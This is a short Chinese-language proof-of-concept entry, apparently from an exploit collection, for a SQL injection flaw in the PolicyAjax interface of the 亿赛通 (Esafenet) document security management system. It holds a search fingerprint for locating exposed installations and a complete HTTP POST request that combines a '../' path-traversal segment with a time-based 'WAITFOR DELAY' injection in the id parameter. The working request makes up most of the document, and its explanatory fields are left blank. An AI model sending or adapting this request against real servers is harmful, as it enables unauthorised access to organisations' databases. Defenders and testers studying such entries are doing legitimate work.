﻿# 亿赛通电子文档管理系统-policyajax接口SQL注入漏洞

> 更新时间：2024-02-01

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：app="亿赛通-电子文档安全管理系统"

> 验证脚本：HTTP

```
POST /CDGServer3/dojojs/../PolicyAjax HTTP/1.1
Cookie: JSESSIONID=0886AB2C8CF7F041586A39EED93C1059
Sec-Ch-Ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded

command=selectOption&id=-1';WAITFOR DELAY '0:0:6'--&type=JMCL
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：


> 验证文件来源：亿赛通电子文档管理系统-policyajax接口SQL注入漏洞.poc
